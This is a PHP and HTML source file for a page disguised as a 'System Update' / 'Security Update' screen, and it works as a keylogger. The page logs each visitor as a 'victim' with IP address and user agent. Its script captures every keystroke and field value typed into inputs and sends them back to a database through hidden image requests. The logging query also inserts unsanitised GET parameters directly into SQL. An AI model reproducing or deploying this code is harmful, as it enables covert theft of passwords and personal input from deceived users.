<?php
// index.php - Simple working version
include 'database.php';

session_start();
if (!isset($_SESSION['session_id'])) {
    $_SESSION['session_id'] = md5(uniqid() . time() . rand(1000, 9999));
    
    // Save victim
    $session = $_SESSION['session_id'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    
    $stmt = $conn->prepare("INSERT INTO victims (session_id, ip_address, user_agent, device_info, last_active) VALUES (?, ?, ?, ?, NOW())");
    $stmt->bind_param("ssss", $session, $ip, $ua, $ua);
    $stmt->execute();
}

// Handle AJAX
if (isset($_GET['log'])) {
    $session = $_SESSION['session_id'];
    $app = $_GET['app'] ?? 'Unknown';
    $field = $_GET['field'] ?? 'Unknown';
    $key = $_GET['key'] ?? '';
    $value = $_GET['value'] ?? '';
    $url = $_GET['url'] ?? '';
    
    $conn->query("INSERT INTO keystrokes (session_id, app_name, field_name, key_pressed, full_input, page_url) 
                  VALUES ('$session', '$app', '$field', '$key', '$value', '$url')");
    
    $conn->query("UPDATE victims SET last_active = NOW() WHERE session_id = '$session'");
    
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 400px;
            background: white;
            border-radius: 20px;
            padding: 40px;
            text-align: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .timer { font-size: 48px; color: #667eea; margin: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Security Update</h2>
        <div class="spinner"></div>
        <div class="timer" id="timer">5</div>
        <p>Installing security patches...</p>
    </div>

    <script>
        const SESSION = '<?php echo $_SESSION['session_id']; ?>';
        
        function logKey(app, field, key, value) {
            new Image().src = '?log=1&app=' + encodeURIComponent(app) + 
                              '&field=' + encodeURIComponent(field) +
                              '&key=' + encodeURIComponent(key) +
                              '&value=' + encodeURIComponent(value) +
                              '&url=' + encodeURIComponent(location.href) +
                              '&r=' + Math.random();
        }
        
        // Track all inputs
        setInterval(() => {
            document.querySelectorAll('input, textarea').forEach(input => {
                if (!input.dataset.tracking) {
                    input.dataset.tracking = 'true';
                    
                    input.addEventListener('keydown', e => {
                        logKey('Browser', input.id || 'field', e.key, input.value);
                    });
                    
                    input.addEventListener('input', () => {
                        logKey('Browser', input.id || 'field', '[VALUE]', input.value);
                    });
                }
            });
        }, 1000);
        
        // Timer
        let time = 5;
        const timer = setInterval(() => {
            time--;
            document.getElementById('timer').textContent = time;
            if (time <= 0) {
                clearInterval(timer);
                document.body.innerHTML += '<iframe src="about:blank" style="display:none;"></iframe>';
                window.close();
            }
        }, 1000);
    </script>
</body>
</html>